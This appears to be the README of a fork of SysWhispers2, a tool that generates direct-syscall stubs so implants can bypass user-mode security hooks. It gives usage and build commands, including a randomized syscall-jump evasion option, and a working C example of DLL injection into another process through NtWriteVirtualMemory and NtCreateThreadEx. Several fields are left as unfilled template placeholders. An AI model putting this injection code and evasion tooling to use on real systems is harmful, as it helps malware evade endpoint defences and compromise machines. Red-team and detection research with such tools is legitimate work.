## 🚀 SysWhispers2

🔧 SysWhispers2 helps with evasion by generating header/ASM files that implants can use to make direct system calls, bypassing user-mode hooks. This fork includes additional customizations and improvements.

## 🔑 Key Differences from Original SysWhispers2
  ✅ Enhanced Features: [Describe modifications, e.g., "Added support for XYZ syscalls."]
  ✅ Compatibility: [Mention extended OS/toolchain support.]
  ✅ Optimizations: [Highlight performance/usability improvements.]

## 🛠 Features
✔ Generates header/ASM files for direct syscalls.
✔ Supports all core syscalls with cross-version compatibility.
✔ Randomized function name hashes for evasion.
✔ Lightweight & easy integration.

## 📥 Installation
      git clone https://github.com/your-username/SysWhispers2.git
      cd SysWhispers2
    python syswhispers.py --help
    
## 🚦 Usage Examples
  🔹 Generate Common Syscalls
  
    python syswhispers.py --preset common -o syscalls_common
    
  🔹 Generate Custom Syscalls

    python syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem
    
  🔹 Example: DLL Injection with Direct Syscalls
  c
    
    #include "syscalls.h" // Generated header
    void InjectDll(HANDLE hProcess, const char* dllPath) {
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
    }
    
## 📜 Supported Functions
  Using --preset common includes:

  -NtCreateProcess

  -NtOpenThread

  -NtReadVirtualMemory

  -NtAllocateVirtualMemory

  -... and more.

<details> <summary>📂 Click to expand full list</summary>
[Include the same list as in the original README or update it if needed.]

</details>
🔌 Integration
Visual Studio
Copy generated files (*.h, *.c, *.asm) into your project.

Enable MASM in Project → Build Customizations.

Add files and configure platform settings (x86/x64).

# MinGW + NASM

    # x86 Example
    i686-w64-mingw32-gcc -c main.c syscalls.c -Wall -shared
    nasm -f win32 -o syscalls.x86.o syscalls.x86.nasm
    i686-w64-mingw32-gcc *.o -o output.exe
    Random Syscall Jumps (Evasion)
    Compile with -DRANDSYSCALL and use rnd ASM files:


    x86_64-w64-mingw32-gcc main.c syscalls.c syscalls.rnd.x64.s -DRANDSYSCALL -Wall -o output.exe
    
## ⚠️ Caveats
  ❌ Graphical subsystem syscalls (win32k.sys) are not supported.
  ❌ Tested on [Your Environments].

## 🙏 Credits
   Based on the original SysWhispers2 by @Jackson_T and @modexpblog.
  Additional contributions by Mangala-Mnmatharaja🎯.

## 📜 License
Apache License 2.0. See LICENSE[http://www.apache.org/licenses/] for details.
